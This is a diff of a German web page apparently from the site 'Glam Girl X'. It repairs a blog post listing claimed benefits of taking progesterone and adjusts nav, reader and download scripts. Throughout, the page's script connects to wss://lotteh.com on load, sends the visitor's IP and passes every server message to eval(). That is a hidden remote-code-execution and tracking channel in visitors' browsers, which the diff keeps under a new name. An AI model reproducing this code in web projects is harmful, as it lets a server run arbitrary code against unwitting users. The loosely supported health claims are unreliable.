@@ -65,7 +65,7 @@
               <a class="nav-link" href="/de/landing" title="Besuchen Sie die Zielseite">Landung</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video -Chat">Chat</a>
+              <a class="nav-link" href="/de/chat" title="Video -Chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/de/private" title="Sehen Sie private Fotos mit einem Schlüssel an">Privat</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="DaisyProfilfoto" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>Von Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> Was sind die Vorteile der Einnahme von Progesteron? </p> <p> <br> </p> <p> 1.Reguliert den Menstruationszyklus: Progesteron spielt eine Schlüsselrolle bei der Regulierung des Menstruationszyklus und kann dazu beitragen, das Gleichgewicht für Personen mit unregelmäßigen Perioden wiederherzustellen. </P> <p> <br> </p> <p> 2.Unterstützt Fruchtbarkeit: Progesteron ist für die Aufrechterhaltung einer gesunden Schwangerschaft von wesentlicher Bedeutung, indem der Uterus auf die Implantation und die Unterstützung des Wachstums des Fötus unterstützt wird. </P> <p> <br> </p> <p> 3.Hilft, Hormone auszugleichen: Progesteron arbeitet im Einklang mit Östrogen, um das hormonelle Gleichgewicht im Körper aufrechtzuerhalten, was dazu beitragen kann, die Symptome hormoneller Ungleichgewichte wie PMS, Wechseljahre und PCOS zu lindern. </P> <p> <br> </p> <p> 4.Verbessert die Stimmung: Es wurde gezeigt, dass Progesteron eine beruhigende Wirkung auf das Gehirn hat und dazu beitragen kann, Symptome von Angstzuständen und Depressionen zu verringern. </P> <p> <br> </p> <p> 5.Unterstützt die Knochengesundheit: Progesteron arbeitet mit anderen Hormonen wie Östrogen und Testosteron zusammen, um die Knochendichte zu unterstützen und das Risiko einer Osteoporose zu verringern. </P> <p> <br> </p> <p> 6.Verbessert den Schlaf: Progesteron kann dazu beitragen, den Schlaf-Wach-Zyklus zu regulieren und die Schlafqualität zu verbessern. </P> <p> <br> </p> <p> 7.Unterstützt Hautgesundheit: Progesteron kann sich positiv auf die Hautgesundheit auswirken, indem sie die Kollagenproduktion fördert und Entzündungen reduziert. </P> <p> <br> </p> <p> 8.Reduziert das Risiko bestimmter Krebserkrankungen: Es wurde gezeigtsollte unter Anleitung eines Gesundheitsdienstleisters verwendet werden, da es Nebenwirkungen und Wechselwirkungen mit anderen haben kann</div>
+<div style="white-space: pre-wrap;"><p>Was sind die Vorteile der Einnahme von Progesteron?</p><p><br/></p><p>1. reguliert den Menstruationszyklus: Progesteron spielt eine Schlüsselrolle bei der Regulierung des Menstruationszyklus und kann dazu beitragen, das Gleichgewicht für Personen mit unregelmäßigen Perioden wiederherzustellen.</p><p><br/></p><p>2. unterstützt Fruchtbarkeit: Progesteron ist für die Aufrechterhaltung einer gesunden Schwangerschaft von wesentlicher Bedeutung, indem die Gebärmutter auf die Implantation und die Unterstützung des Wachstums des Fötus unterstützt wird.</p><p><br/></p><p>3.. Hilft, Hormone auszugleichen: Progesteron arbeitet im Einklang mit Östrogen, um das hormonelle Gleichgewicht im Körper aufrechtzuerhalten, was dazu beitragen kann, die Symptome hormoneller Ungleichgewichte wie PMS, Wechseljahre und PCOS zu lindern.</p><p><br/></p><p>4. Verbessert die Stimmung: Progesteron hat gezeigt, dass er sich beruhigend auf das Gehirn auswirkt und dazu beitragen kann, Angst- und Depressionssymptome zu verringern.</p><p><br/></p><p>5. Unterstützt die Knochengesundheit: Progesteron arbeitet mit anderen Hormonen wie Östrogen und Testosteron zusammen, um die Knochendichte zu unterstützen und das Osteoporoserisiko zu verringern.</p><p><br/></p><p>6. Verbessert den Schlaf: Progesteron kann dazu beitragen, den Schlaf-Wach-Zyklus zu regulieren und die Schlafqualität zu verbessern.</p><p><br/></p><p>7. Unterstützt Hautgesundheit: Progesteron kann sich positiv auf die Hautgesundheit auswirken, indem sie die Kollagenproduktion fördert und Entzündungen reduziert.</p><p><br/></p><p>8. Reduziert das Risiko bestimmter Krebserkrankungen: Es wurde gezeigt, dass Progesteron eine Schutzwirkung gegen bestimmte Krebsarten wie Endometriumkrebs hat.</p><p><br/></p><p>Es ist wichtig zu beachten, dass Progesteron unter der Anleitung eines Gesundheitsdienstleisters verwendet werden sollte, da es Nebenwirkungen und Wechselwirkungen mit anderen Medikamenten haben kann.</p><div><br/></div></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -240,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -250,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -427,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -450,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
